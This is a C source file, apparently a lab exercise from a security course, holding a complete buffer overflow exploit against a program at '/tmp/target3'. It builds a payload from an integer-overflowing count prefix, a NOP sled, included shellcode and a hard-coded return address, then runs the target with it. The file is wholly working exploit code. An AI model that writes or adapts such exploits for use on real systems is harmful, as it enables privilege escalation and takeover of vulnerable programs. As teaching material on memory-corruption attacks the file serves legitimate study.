#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP    0x90

int main(void)
{
  char *args[3];
  char *env[1];

  // calculate size to overflow buffer with
  int ofsize = (32 * 856) + 27;

  char payload[ofsize];
  int i;

  // include ASCII count in front 
  payload[0] = '2';
  payload[1] = '1';
  payload[2] = '4';
  payload[3] = '7';
  payload[4] = '4';
  payload[5] = '8';
  payload[6] = '4';
  payload[7] = '5';
  payload[8] = '0';
  payload[9] = '5';
  payload[10] = ',';
  
  // Fill payload with NOPs
  for(i = 11; i < ofsize; i++) {
    payload[i] = NOP;
  }

  // Inject shellcode
  int ptr = (ofsize/2) + 1;
  for(i = 0; i < strlen(shellcode); i++) {
    payload[ptr] = shellcode[i];
    ptr++;
  } 

  // Inject overwrite address to payload
  payload[ofsize-4] = 0x30;
  payload[ofsize-3] = 0x28;
  payload[ofsize-2] = 0xFF;
  payload[ofsize-1] = 0xBF;
  
  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
